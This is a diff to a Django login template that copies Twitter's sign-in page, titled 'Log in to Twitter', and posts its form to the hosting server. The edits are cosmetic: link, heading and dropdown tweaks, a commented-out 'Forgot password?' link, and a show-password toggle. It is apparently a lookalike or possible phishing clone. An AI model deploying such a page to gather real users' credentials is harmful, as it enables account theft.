@@ -39,17 +39,17 @@ dir="ltr" onload="myFunction1()">
               </a>
             </li>
             <li id="global-nav-about" class="about" data-global-action="about">
-              <a class="js-tooltip js-dynamic-tooltip" data-placement="bottom" href="#" data-component-context="about_nav" data-nav="about" rel="noopener">
+              <a class="js-tooltip js-dynamic-tooltip" data-placement="bottom" href="{% url 'about' %}" data-component-context="about_nav" data-nav="about" rel="noopener">
                 <span class="text">About</span>
               </a>
             </li>
           </ul>
           <div class="pull-right nav-extras">
             <ul class="nav secondary-nav language-dropdown">
-              <li class="dropdown js-language-dropdown">
-                <a href="#supported_languages" class="dropdown-toggle js-dropdown-toggle">
-                  <small>Language:</small> <span class="js-current-language">English</span> <b class="caret"></b>
-                </a>
+              <li class="dropdown js-language-dropdown"><br>
+                <p href="#supported_languages" class="dropdown-toggle js-dropdown-toggle">
+                  <small>Language:</small> <span class="js-current-language">English</span>
+                </p>
               </li>
             </ul>
         </div>
@@ -61,7 +61,7 @@ dir="ltr" onload="myFunction1()">
   <div id="page-container" class="AppContent wrapper wrapper-login">
     <div class="page-canvas">
       <div class="signin-wrapper" data-login-message="">
-        <h1>Log in to Twitter</h1>
+        <h1>Log In To Twitter</h1>
         <form method="post" class="t1-form clearfix signin js-signin">
           {% csrf_token %}
           {{ form.as_p }}
@@ -70,8 +70,8 @@ dir="ltr" onload="myFunction1()">
             <label class="t1-label remember">
               <input type="checkbox" value="0" name="remember_me" onclick="myFunction()">
               Show Password
-              <span class="separator">·</span>
-              <a class="forgot" href="#" rel="noopener">Forgot password?</a>
+              <!-- <span class="separator">·</span>
+              <a class="forgot" href="#" rel="noopener">Forgot password?</a> -->
             </label>
           </div>
         </form>
@@ -111,7 +111,7 @@ dir="ltr" onload="myFunction1()">
 </body>
 {% endblock %}
 {% block scripts %}
-<script>
+<script >
 function myFunction() {
     var x = document.getElementById("id_password");
     if (x.type === "password") {
@@ -124,11 +124,15 @@ function myFunction1() {
     document.getElementById("id_username").placeholder = "please enter username";
     document.getElementById("id_password").placeholder = "please enter password";
 }
+
 </script>
 <style type="text/css">
   p{
     margin-bottom: 20px;
   }
+
+
+
 </style>
 
 {% endblock %}
